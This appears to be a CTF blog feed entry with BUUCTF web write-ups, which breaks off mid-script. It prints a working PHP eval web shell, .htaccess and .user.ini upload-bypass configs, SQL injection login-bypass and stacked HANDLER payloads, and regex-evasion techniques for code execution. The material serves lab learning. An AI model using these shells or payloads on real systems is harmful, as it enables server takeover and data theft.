<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>aihenai</title>
  
  
  <link href="https://aihenai.github.io/atom.xml" rel="self"/>
  
  <link href="https://aihenai.github.io/"/>
  <updated>2025-12-07T13:48:10.328Z</updated>
  <id>https://aihenai.github.io/</id>
  
  <author>
    <name>aihenai</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>buuctf平台刷题题解2</title>
    <link href="https://aihenai.github.io/2025/12/07/12.1-12.7buuctf/"/>
    <id>https://aihenai.github.io/2025/12/07/12.1-12.7buuctf/</id>
    <published>2025-12-06T16:00:00.000Z</published>
    <updated>2025-12-07T13:48:10.328Z</updated>
    
    <content type="html"><![CDATA[<h2 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h2><p>BUUCTF</p><h2 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h2><p>12.1-12.7</p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>题目给出了源码地址，那我们先进去看看</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207144403054.png"></p><p>源码的内容为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">echo &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; </span><br><span class="line">&lt;title&gt;Upload&lt;/title&gt;</span><br><span class="line">&lt;form action=\&quot;\&quot; method=\&quot;post\&quot; enctype=\&quot;multipart/form-data\&quot;&gt;</span><br><span class="line">上传文件&lt;input type=\&quot;file\&quot; name=\&quot;uploaded\&quot; /&gt;</span><br><span class="line">&lt;input type=\&quot;submit\&quot; name=\&quot;submit\&quot; value=\&quot;上传\&quot; /&gt;</span><br><span class="line">&lt;/form&gt;&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_SESSION[&#x27;user&#x27;]))&#123;</span><br><span class="line">    $_SESSION[&#x27;user&#x27;] = md5((string)time() . (string)rand(100, 1000));</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_FILES[&#x27;uploaded&#x27;])) &#123;</span><br><span class="line">    $target_path  = getcwd() . &quot;/upload/&quot; . md5($_SESSION[&#x27;user&#x27;]);</span><br><span class="line">    $t_path = $target_path . &quot;/&quot; . basename($_FILES[&#x27;uploaded&#x27;][&#x27;name&#x27;]);</span><br><span class="line">    $uploaded_name = $_FILES[&#x27;uploaded&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,&#x27;.&#x27;) + 1);</span><br><span class="line">    $uploaded_size = $_FILES[&#x27;uploaded&#x27;][&#x27;size&#x27;];</span><br><span class="line">    $uploaded_tmp  = $_FILES[&#x27;uploaded&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line"> </span><br><span class="line">    if(preg_match(&quot;/ph/i&quot;, strtolower($uploaded_ext)))&#123;</span><br><span class="line">        die(&quot;后缀名不能有ph！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        if ((($_FILES[&quot;uploaded&quot;][&quot;type&quot;] == &quot;</span><br><span class="line">            &quot;) || ($_FILES[&quot;uploaded&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || ($_FILES[&quot;uploaded&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)) &amp;&amp; ($_FILES[&quot;uploaded&quot;][&quot;size&quot;] &lt; 2048))&#123;</span><br><span class="line">            $content = file_get_contents($uploaded_tmp);</span><br><span class="line">            if(preg_match(&quot;/\&lt;\?/i&quot;, $content))&#123;</span><br><span class="line">                die(&quot;诶，别蒙我啊，这标志明显还是php啊&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                mkdir(iconv(&quot;UTF-8&quot;, &quot;GBK&quot;, $target_path), 0777, true);</span><br><span class="line">                move_uploaded_file($uploaded_tmp, $t_path);</span><br><span class="line">                echo &quot;&#123;$t_path&#125; succesfully uploaded!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;上传类型也太露骨了吧！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析源码，发现源码有几个过滤规则：</p><p>1、会提取文件后缀名，不允许包含ph字符</p><p>2、只允许图片类型为image&#x2F;pjpeg和image&#x2F;pjpeg</p><p>3、图片大小不能超过2048字节</p><p>4、文件的内容不能包含&lt;?字符，过滤了php标签</p><p>对于这个过滤规则，我们可以使用.htaccess配置文件来绕过</p><p>我们先创建一个文本，写入如下内容，然后重命名为.htaccess.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>然后抓包删去.jpg再发送</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207150013407.png"></p><p>上传成功</p><p>然后同样的我们创建另一个文本文档，写入如下内容之后，重命名为1.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">    eval($_POST[&#x27;a&#x27;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>同样上传</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207150209060.png"></p><p>然后用蚁剑连接</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207150904245.png"></p><p>查看根目录，发现flag</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207150953890.png"></p><p>成功得到flag</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207151007127.png"></p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>该题一样给出了源码，先去看看源码</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207151310776.png"></p><p>源码内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Upload Labs&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Upload Labs&lt;/h2&gt;</span><br><span class="line">    &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;fileUpload&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// error_reporting(0);</span><br><span class="line">$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);</span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];</span><br><span class="line">    if (!$tmp_name) &#123;</span><br><span class="line">        die(&quot;filesize too big!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!$name) &#123;</span><br><span class="line">        die(&quot;filename cannot be empty!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);</span><br><span class="line">    if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) &#123;</span><br><span class="line">        die(&quot;illegal suffix!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123;</span><br><span class="line">        die(&quot;&amp;lt;? in contents!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    if (!$image_type) &#123;</span><br><span class="line">        die(&quot;exif_imagetype:not image!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . &quot;/&quot; . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    echo &quot;Your dir &quot; . $userdir. &#x27; &lt;br&gt;&#x27;;</span><br><span class="line">    echo &#x27;Your files : &lt;br&gt;&#x27;;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析源码得到其中的过滤规则如下：</p><p>1、拦截过大文件和空名文件</p><p>2、以文件名最后一个点号作为文件名后缀进行检测，不允许包含ph或htacess字符</p><p>3、读取文件内容，不允许包含&lt;?字符</p><p>4、读取文件头前几位，判断是否为标准图片头</p><p>这题一开始用的.htaccess文件，因为源码中写的是htacess，少了一个c，所以是可以上传的，但是当我把配置文件和木马图都上传之后，传参和蚁剑连接都不行，因为它后台貌似并没有解析这个PHP代码，于是去网上冲浪了一会，找到了用.user.ini配置文件，以php方式解析指定文件的方法</p><p>我们创建一个文本，写入如下内容，然后重命名为.user.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=1.jpg</span><br></pre></td></tr></table></figure><p>再创建一个文本，写入如下内容，重命名为1.jpg（上个题目原样的木马图直接套用即可）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">    eval($_POST[&#x27;a&#x27;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>将其都上传</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207155421221.png"></p><p>然后就可以用蚁剑连接或者传参了（需要在url最后加上&#x2F;index.php）</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207155250962.png"></p><p>然后即可得到flag</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207155516783.png" alt="image-20251207155516783"></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>1、.user.ini文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">介绍：</span><br><span class="line">.user.ini 是 PHP 从 5.3.0 版本 开始引入的用户级分布式配置文件，属于 PHP 解释器层面的配置（而非 Web 服务器配置），作用是在指定目录下自定义 PHP 的运行时规则 </span><br><span class="line"></span><br><span class="line">作用范围：</span><br><span class="line">当前目录与子目录</span><br><span class="line"></span><br><span class="line">要求版本：</span><br><span class="line">PHP 版本≥5.3.0</span><br></pre></td></tr></table></figure><p>2、auto_prepend_file与auto_append_file</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file指定在主文件之前自动解析的文件名</span><br><span class="line">auto_append_file指定在主文件之后自动解析的文件名</span><br><span class="line">一个是前一个是后，我们这里用的是主文件之前，也就是上面那个</span><br></pre></td></tr></table></figure><p>3、为什么需要在url最后加上&#x2F;index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.user.ini生效需要有一个主文件进行解析，我们用的auto_prepend_file它是自动包含并解析在主文件之前的文件名，我们是要它在解析index.php之前顺带把我们的木马图进行解析了</span><br></pre></td></tr></table></figure><p>4、为什么.htaccess没被过滤也不生效</p><p>因为服务器为nginx，文件不生效QAQ</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207161505880.png"></p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>题目是SQli，那应该是sql注入没跑，进去先测试闭合方式</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207162341010.png"></p><p>闭合方式为单引号，且响应中附带了一些编码，尝试一番之后，是base32套base64</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207162505927.png"></p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207162532518.png"></p><p>解码出来为select * from user where username &#x3D; ‘$name’；是一句sql语句，告诉我们这题的注入点为name，且为单引号闭合</p><p>我们进行列数测试，输到1’ union select 1,2,3 #出现了wrong user的字样，说明有三列</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207162827440.png"></p><p>本想从数据库一路找下去，但是刚开始就死了，database()被过滤了</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207163647497.png"></p><p>然后回到题目去看了search.php的源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;Do you know who am I?&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require &quot;config.php&quot;;</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">// 去除转义</span><br><span class="line">if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">function stripslashes_deep($value)</span><br><span class="line">&#123;</span><br><span class="line">$value = is_array($value) ?</span><br><span class="line">array_map(&#x27;stripslashes_deep&#x27;, $value) :</span><br><span class="line">stripslashes($value);</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);</span><br><span class="line">$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);</span><br><span class="line">$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);</span><br><span class="line">$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$password = $_POST[&#x27;pw&#x27;];</span><br><span class="line">$t_pw = md5($password);</span><br><span class="line">$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">// echo $sql;</span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;</span><br><span class="line">die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">if (!$result) &#123;</span><br><span class="line">printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">// echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">$arr = mysqli_fetch_row($result);</span><br><span class="line">// print_r($arr);</span><br><span class="line">if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">if(md5($password) == $arr[2])&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">die(&quot;wrong pass!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">die(&quot;wrong user!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>1、过滤了()、&#x3D;、or字符</p><p>2、需要传入的密码的md5值与密码字段相等方可输出flag</p><p>那我们可以构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#&amp;pw=1</span><br></pre></td></tr></table></figure><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207165206708.png"></p><p>成功获取flag</p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>进来先探测闭合方式，发现是单引号闭合</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207165843499.png"></p><p>注入1’ union select 1,2 #时提示被过滤</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207170110221.png"></p><p>禁用掉了一些常用的关键字，我们转变方式用堆叠注入</p><p>查数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207170220382.png"></p><p>查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables;#</span><br></pre></td></tr></table></figure><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207170307500.png"></p><p>查字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from FlagHere;#</span><br></pre></td></tr></table></figure><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207170808291.png"></p><p>到这里已经很接近flag了，但是常用的查询语句的关键字被ban掉了，于是我去找了一些不那么常用的：handler</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler table_name open;handler table_name read next;handler table_name close;</span><br></pre></td></tr></table></figure><p>修改为对应表名，然后加上头和尾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;handler FlagHere open;handler FlagHere read next;handler FlagHere close;#</span><br></pre></td></tr></table></figure><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207171113396.png"></p><p>成功得到flag</p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>handler</p><p>handler是MYSQL的特有关键字，用于直接访问表的存储引擎接口，可以作为select和show的替代方案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line">handler 表名 [open/close]打开或关闭某个表</span><br><span class="line">handler 表名 read [first/next]读取某个表的第一行或者下一行</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>（进去之后试了很久，sql注入，口令爆破什么的都试了，一点反应都没有，然后就去网上找教程了）</p><p>点击页面中的help，可以看到</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207172501471.png"></p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207172535634.png"></p><p>可以看到页面尝试get请求这个文件，但是没有反应，我们将它换成post请求，即可下载文件</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207172806062.png"></p><p>打开发现并没有什么有用的信息</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207172830009.png"></p><p>我们将目标转换到web.xml</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207173102682.png"></p><p>打开web.xml</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207173200918.png"></p><p>可以查看到Flag文件的位置</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207173503934.png"></p><p>打开文件</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207173542664.png"></p><p>得到flag的base64编码，将其解码即可得到flag</p><p><img src="/2025/12/07/12.1-12.7buuctf/image-20251207173624740.png"></p><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><p>WEB-INF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主要包含以下文件或目录： </span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 </span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 </span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p>先看给出的源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">            $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;</span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析源码，不能使用字母和数字，想要获取flag却又需要注入命令，而限制字符数要小于40</p><p>理论上来说我们能使用的只有各种符号，那么我们想构造命令的话就得通过异或，取反，自增等手段来获得想要的字符</p><p>自增通常比较长，这里有长度限制，非常容易超出上限，不考虑</p><h3 id="取反方式"><a href="#取反方式" class="headerlink" title="取反方式"></a>取反方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先将php命令进行取反，变成不可打印字符，然后url编码，最后在url编码前面加一个~，这样在被传进去后，先会被解码，然后因为是不可打印字符，所以可以绕过正则匹配，再然后因为前面加了~，~是取反符号，会再进行一次取反，然后得到原本的php命令，从而绕过正则匹配机制达到想要的目的</span><br></pre></td></tr></table></figure><h3 id="异或方式"><a href="#异或方式" class="headerlink" title="异或方式"></a>异或方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为两次异或会得到原值，且不可打印字符是可以绕过正则匹配的</span><br><span class="line">那么用不可打印字符异或出我们需要的命令是完全可能的</span><br></pre></td></tr></table></figure><p>因为取反比较简单，而且可以用个短小的脚本来生成payload，所以我这里用的是取反，简单写个脚本帮我们做取反和url编码的事情</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;&#x27;;</span><br><span class="line">$b=urlencode(~$a);</span><br><span class="line">echo &#x27;(&#x27; .&#x27;~&#x27;. $b . &#x27;)&#x27;;</span><br><span class="line"></span><br><span class="line">$c=&#x27;&#x27;;</span><br><span class="line">$d=urlencode(~$c);</span><br><span class="line">echo &#x27;(&#x27; .&#x27;~&#x27;. $d . &#x27;)&#x27;;</span><br><span 